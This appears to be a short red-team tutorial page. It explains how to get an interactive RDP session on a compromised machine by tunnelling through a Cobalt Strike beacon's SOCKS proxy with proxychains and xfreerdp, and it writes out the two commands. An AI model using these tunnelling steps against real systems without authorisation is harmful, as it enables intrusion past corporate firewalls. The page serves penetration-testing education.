---
description: Lateral Movement, Tunnelling, Firewall Evasion
---

# From Beacon to Interactive RDP Session

## From Beacon to Interactive RDP Session

This is a quick note showing how to get an interactive Remote Desktop Session (RDP) session from a Cobalt Strike beacon by leveraging socks proxy and proxychains.

### Socks Proxy

Say we have compromised a box and we have a beacon running on it:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoL_qdltSK_Yrap8KjG%2Fimage.png?alt=media\&token=15c61e44-09a2-4c42-ab5e-2407c23c62cc)

The same compromised machine is listening on 3389, meaning it accepts incoming RDP connections:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoL_k6uTIZcF6enCdnd%2Fimage.png?alt=media\&token=34f5561c-63ed-481d-a42f-0dbb56f57251)

Most often you will not be able to reach the machine via RDP from the outside due to corporate and host firewalls, however not all is lost - the machine is still reachable over RDP via sock proxy capability that the beacon provides.

Using the beacon we control, let's create a socks proxy on port 7777. This will expose a TCP port 7777 on the teamserver:

```
socks 7777
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoLZzsK5nFMzPv_AlL1%2Fimage.png?alt=media\&token=3be760a0-94c7-4045-a632-d2d3d0524c85)

### Proxychains

With the socks proxy create, we can now jump onto any linux box (Kali in my case) and configure proxychains to point it to the teamserver and the port we've just exposed:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoL_G3xxZLzU2rhS1GB%2Fimage.png?alt=media\&token=17786bc3-e32b-408b-96e4-c3fb88a8ba2c)

We can now connect to the compromised box via RDP using xfreerdp:

{% code title="attacker\@kali" %}
```
proxychains xfreerdp /v:127.0.0.1:3389 /u:spotless
```
{% endcode %}

Below illustrates a successful RDP connection was established although the user on the other end (me) killed the session:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoLZmCDGBXUlHKbuhqb%2Fimage.png?alt=media\&token=e14c4eef-c1b4-41b7-a409-c219812d6816)

{% hint style="warning" %}
**If you are getting...**\
`Error: CredSSP initialize failed, do you have correct kerberos ticket initialized?`\
`Failed to connect, CredSSP required by server`

Suggestion is to use `xfreerdp` instead of `rdesktop` and the issue will go away.
{% endhint %}

![CredSSP error using rdesktop](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLYSqax1zz3N1CBZJJ%2F-LoLYpb53XxfhUw3cE_F%2Fimage.png?alt=media\&token=bcdc57a3-34c7-42c1-a78f-a58102cd79a8)
